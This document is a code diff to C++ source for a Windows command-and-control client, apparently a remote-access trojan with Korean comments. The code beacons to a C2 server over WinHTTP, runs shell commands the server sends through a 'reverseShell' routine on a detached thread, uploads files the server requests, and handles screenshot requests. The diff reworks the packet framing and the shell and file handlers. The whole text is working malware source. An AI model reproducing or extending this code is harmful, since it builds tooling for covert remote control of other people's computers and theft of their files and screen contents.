@@ -6,6 +6,7 @@
 #include <olectl.h>
 #include <list>
 #include <sstream>
+#include <thread>
 #include "cncManager.h"
 #include "commandManager.h"
 
@@ -75,7 +76,6 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
                 printf("Error %u in WinHttpReadData.\n", GetLastError());
 
             else
-                //std::wcout << pszOutBuffer << std::endl;
                 this->responseParser((UCHAR *)pszOutBuffer, dwSize);
 
             delete[] pszOutBuffer;
@@ -92,7 +92,7 @@ void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {
 }   
 /* C&C에 데이터 보내는 함수. sendHttpRequest를 Wrapping함. */
 void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
-    if (dlen <= 0xffff) {
+    if (dlen <= DATA_BUF_SIZE) {
         DDprotocol* dataFrame = new DDprotocol;
         dataFrame->type = DDtype;
         dataFrame->len = dlen;
@@ -112,19 +112,19 @@ void cncManager::sendData(UCHAR DDtype, ULONG64 dlen, LPVOID data) {
         DWORD seq = 1;
         ULONG64 left_offset = dlen, sended_offset = 0;
     
-        while(left_offset > MAX_DATA_LEN){
+        while(left_offset > DATA_BUF_SIZE){
             DDprotocol* dataFrame = new DDprotocol;
             dataFrame->type = DDtype;
-            dataFrame->len = MAX_DATA_LEN;
+            dataFrame->len = DATA_BUF_SIZE;
             dataFrame->seq = seq;
-            UCHAR* stream = new UCHAR[MAX_DATA_LEN + sizeof(DDprotocol)];
-            memset(stream, 0, sizeof(DDprotocol) + MAX_DATA_LEN);
+            UCHAR* stream = new UCHAR[DATA_BUF_SIZE + sizeof(DDprotocol)];
+            memset(stream, 0, sizeof(DDprotocol) + DATA_BUF_SIZE);
             memcpy(stream, dataFrame, sizeof(DDprotocol));
-            memcpy(stream + sizeof(DDprotocol), (LPVOID)((UCHAR *)data + sended_offset), MAX_DATA_LEN);
-            this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + MAX_DATA_LEN);
+            memcpy(stream + sizeof(DDprotocol), (LPVOID)((UCHAR *)data + sended_offset), DATA_BUF_SIZE);
+            this->sendHttpRequest((LPVOID)stream, sizeof(DDprotocol) + DATA_BUF_SIZE);
             seq++;
-            left_offset -= MAX_DATA_LEN;
-            sended_offset += MAX_DATA_LEN;
+            left_offset -= DATA_BUF_SIZE;
+            sended_offset += DATA_BUF_SIZE;
             delete[] stream;
             delete dataFrame;
         }
@@ -162,7 +162,7 @@ void cncManager::sendBeacon() {
 }
 
 void cncManager::responseParser(UCHAR* res, DWORD len) {
-    if (len < 8)
+    if (len < sizeof(DDprotocol))
         std::cout << "Invalid Protocol !!!" << std::endl;
     
     else
@@ -170,28 +170,28 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
         DDprotocol* resData = new DDprotocol;
         resData->header = res[0];
         resData->type = res[1];
-        resData->len = *(USHORT *)(res+2);
-        resData->seq = *(DWORD *)(res+4);
+        resData->len = *(DWORD *)(res+2);
+        resData->seq = *(DWORD *)(res+6);
 
         if (resData->header != DDPROTO_HEADER)
             std::cout << "Invalid Header !!!" << std::endl;
 
         else {
-            std::string data = (char*)(res + 8);
+            std::string data = (char*)(res + 10);
             /* response 핸들러 구현부 */
             switch (resData->type)
             {
+                case ACK:
+                {
+                    //this->printParsedResponse(resData, "ACK");
+                    break;
+                }
+
                 case error:
                 {
                     this->printParsedResponse(resData, "ERROR");
                     break;
-                }               
-
-                case beaconResponse:
-                {
-                    //this->printParsedResponse(resData, "BEACON_RESPONSE");
-                    break;
-                }                
+                }                            
 
                 case shellRequest:
                 {
@@ -201,11 +201,16 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                     while (std::getline(spliter, tmp, ';')) {
                         this->shellCmd.push_back(tmp);
                     }
+
+                    std::thread shellHandler = std::thread(&cncManager::handleShellRequest, this);
+                    shellHandler.detach();
+
                     break;
                 }
 
                 case ftpRequest:
                 {
+                 clock_t start, end;
                  commandManager cmd;
                  LPVOID ptr = NULL;
                     /* 스샷 요청 처리 */
@@ -217,17 +222,14 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
                     }
                     /* 파일 요청 처리 */
                     else {
-                        ptr = cmd.getFile(data);
-                        this->sendData(ftpResponse, cmd.file_len, ptr);
-                        delete[] ptr;
-                        
+                        this->handleFtpRequest(data);
                     }
                     break;
                 }
             
                 case none:
                 {
-                    //this->printParsedResponse(resData, "NONE");
+                    this->printParsedResponse(resData, "NONE");
                     break;
                 }
                 
@@ -254,20 +256,17 @@ void cncManager::printParsedResponse(DDprotocol* resData,std::string type) {
     std::cout << "===============" << std::endl;
 }
 
-void cncManager::handleRequest() {
+void cncManager::handleShellRequest() {
     commandManager commander;
     std::string result;
-    while (TRUE) {
-        this->sendData(beaconRequest, BEACON_DATA_LEN, BEACON_DATA);
-
         while (!this->shellCmd.empty()) {
             result = commander.reverseShell(this->shellCmd.front());
-            /* For DEBUG */
-            //std::cout << result;
             this->sendData(shellResponse, result.size(), (LPVOID)result.c_str());
             this->shellCmd.pop_front();
         }
-        /* For DEBUG */
-        Sleep(300);
-    }
+}
+
+void cncManager::handleFtpRequest(std::string path) {
+    commandManager commander;
+    commander.getFile(path);
 }
